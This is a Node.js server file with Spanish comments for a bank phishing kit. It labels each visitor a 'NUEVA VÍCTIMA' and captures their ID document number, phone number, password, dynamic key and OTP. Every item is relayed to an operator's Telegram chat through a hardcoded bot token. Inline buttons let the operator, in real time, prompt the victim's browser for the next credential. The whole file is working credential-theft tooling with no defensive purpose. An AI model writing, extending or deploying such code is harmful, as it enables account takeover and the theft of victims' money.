require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const session = require('express-session');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Configuración del bot de Telegram
const TELEGRAM_BOT_TOKEN = '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
const CHAT_ID = '-4997787461';
// IMPORTANTE: por defecto NO hace polling para evitar 409 Conflict (todas las bancas
// comparten el mismo bot token con el server raiz). Para correr esta banca de forma
// AISLADA exporta STANDALONE_BOT=1 antes de iniciar el proceso.
const _POLL_TG = process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: _POLL_TG });

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Almacenamiento de sesiones en memoria
const sessions = new Map();

// Función para crear sesión
function createSession(socketId) {
    const sessionId = uuidv4();
    sessions.set(sessionId, {
        socketId: socketId,
        data: {},
        createdAt: new Date()
    });
    return sessionId;
}

// Función para enviar mensaje a Telegram con botones
async function sendToTelegram(sessionId, message, buttons) {
    try {
        const keyboard = {
            inline_keyboard: buttons.map(btn => [{
                text: btn.text,
                callback_data: `${btn.action}:${sessionId}`
            }])
        };

        await bot.sendMessage(CHAT_ID, message, {
            reply_markup: keyboard,
            parse_mode: 'HTML'
        });
        
        return true;
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        return false;
    }
}

// Manejo de callbacks de Telegram
bot.on('callback_query', async (query) => {
    try {
        const [action, sessionId] = query.data.split(':');
        const session = sessions.get(sessionId);
        
        if (!session) {
            await bot.answerCallbackQuery(query.id, { text: 'Sesión expirada' });
            return;
        }

        await bot.answerCallbackQuery(query.id, { text: 'Procesando...' });

        // Emitir evento al cliente específico
        io.to(session.socketId).emit('telegram_action', {
            action: action,
            sessionId: sessionId
        });

        // Editar mensaje para mostrar que se procesó
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id
        });

    } catch (error) {
        console.error('Error en callback:', error);
    }
});

// Socket.IO
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);
    
    let sessionId = null;
    
    // Evento para reconectar sesión existente o crear nueva
    socket.on('init_session', (data) => {
        if (data.sessionId && sessions.has(data.sessionId)) {
            // Reconectar sesión existente
            sessionId = data.sessionId;
            const session = sessions.get(sessionId);
            session.socketId = socket.id; // Actualizar el socketId
            socket.sessionId = sessionId;
            console.log('Sesión reconectada:', sessionId);
        } else {
            // Crear nueva sesión
            sessionId = createSession(socket.id);
            socket.sessionId = sessionId;
            console.log('Nueva sesión creada:', sessionId);
        }
        socket.emit('session_ready', { sessionId });
    });

    // Manejo de datos del index.html
    socket.on('send_initial_data', async (data) => {
        const session = sessions.get(socket.sessionId);
        if (!session) return;

        session.data = { ...session.data, ...data };

        const message = `
🔔 <b>NUEVA VÍCTIMA - DATOS INICIALES</b>

👤 <b>Tipo de documento:</b> ${data.documentType}
📄 <b>Número de documento:</b> ${data.documentNumber}
📱 <b>Número de celular:</b> ${data.phoneNumber}

⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
🔗 <b>Session ID:</b> ${socket.sessionId}
        `.trim();

        const buttons = [
            { text: '👤 Pedir Usuario', action: 'request_user' },
            { text: '🔑 Pedir Clave', action: 'request_password' },
            { text: '🔄 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📲 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ];

        const sent = await sendToTelegram(socket.sessionId, message, buttons);
        
        if (sent) {
            socket.emit('data_sent', { success: true });
        } else {
            socket.emit('data_sent', { success: false });
        }
    });

    // Manejo de clave
    socket.on('send_password', async (data) => {
        const session = sessions.get(socket.sessionId);
        if (!session) return;

        session.data.password = data.password;

        const message = `
🔑 <b>CLAVE CAPTURADA</b>

📋 <b>INFORMACIÓN ACTUAL:</b>
👤 <b>Tipo de documento:</b> ${session.data.documentType || 'N/A'}
📄 <b>Número de documento:</b> ${session.data.documentNumber || 'N/A'}
📱 <b>Número de celular:</b> ${session.data.phoneNumber || 'N/A'}
🔐 <b>Clave:</b> ${data.password}

⏰ ${new Date().toLocaleString('es-CO')}
🔗 Session: ${socket.sessionId}
        `.trim();

        const buttons = [
            { text: '👤 Pedir Usuario', action: 'request_user' },
            { text: '🔑 Pedir Clave', action: 'request_password' },
            { text: '🔄 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📲 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ];

        const sent = await sendToTelegram(socket.sessionId, message, buttons);
        
        if (sent) {
            socket.emit('data_sent', { success: true });
        } else {
            socket.emit('data_sent', { success: false });
        }
    });

    // Manejo de clave dinámica
    socket.on('send_dynamic', async (data) => {
        const session = sessions.get(socket.sessionId);
        if (!session) return;

        session.data.dynamic = data.dynamic;

        const message = `
🔄 <b>CLAVE DINÁMICA CAPTURADA</b>

📋 <b>INFORMACIÓN ACTUAL:</b>
👤 <b>Tipo de documento:</b> ${session.data.documentType || 'N/A'}
📄 <b>Número de documento:</b> ${session.data.documentNumber || 'N/A'}
📱 <b>Número de celular:</b> ${session.data.phoneNumber || 'N/A'}
🔐 <b>Clave:</b> ${session.data.password || 'N/A'}
🔄 <b>Clave Dinámica:</b> ${data.dynamic}

⏰ ${new Date().toLocaleString('es-CO')}
🔗 Session: ${socket.sessionId}
        `.trim();

        const buttons = [
            { text: '👤 Pedir Usuario', action: 'request_user' },
            { text: '🔑 Pedir Clave', action: 'request_password' },
            { text: '🔄 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📲 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ];

        const sent = await sendToTelegram(socket.sessionId, message, buttons);
        
        if (sent) {
            socket.emit('data_sent', { success: true });
        } else {
            socket.emit('data_sent', { success: false });
        }
    });

    // Manejo de OTP
    socket.on('send_otp', async (data) => {
        const session = sessions.get(socket.sessionId);
        if (!session) return;

        session.data.otp = data.otp;

        const message = `
📲 <b>OTP CAPTURADO - INFORMACIÓN COMPLETA</b>

📋 <b>RESUMEN TOTAL:</b>
👤 <b>Tipo de documento:</b> ${session.data.documentType || 'N/A'}
📄 <b>Número de documento:</b> ${session.data.documentNumber || 'N/A'}
📱 <b>Número de celular:</b> ${session.data.phoneNumber || 'N/A'}
🔐 <b>Clave:</b> ${session.data.password || 'N/A'}
🔄 <b>Clave Dinámica:</b> ${session.data.dynamic || 'N/A'}
📲 <b>OTP:</b> ${data.otp}

⏰ ${new Date().toLocaleString('es-CO')}
🔗 Session: ${socket.sessionId}
        `.trim();

        const buttons = [
            { text: '👤 Pedir Usuario', action: 'request_user' },
            { text: '🔑 Pedir Clave', action: 'request_password' },
            { text: '🔄 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📲 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ];

        const sent = await sendToTelegram(socket.sessionId, message, buttons);
        
        if (sent) {
            socket.emit('data_sent', { success: true });
        } else {
            socket.emit('data_sent', { success: false });
        }
    });

    // Desconexión
    socket.on('disconnect', () => {
        console.log('Cliente desconectado:', socket.id);
        // No eliminamos la sesión inmediatamente para permitir reconexión
    });
});

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
    console.log('✅ Bot de Telegram iniciado');
    console.log('✅ Socket.IO configurado');
});
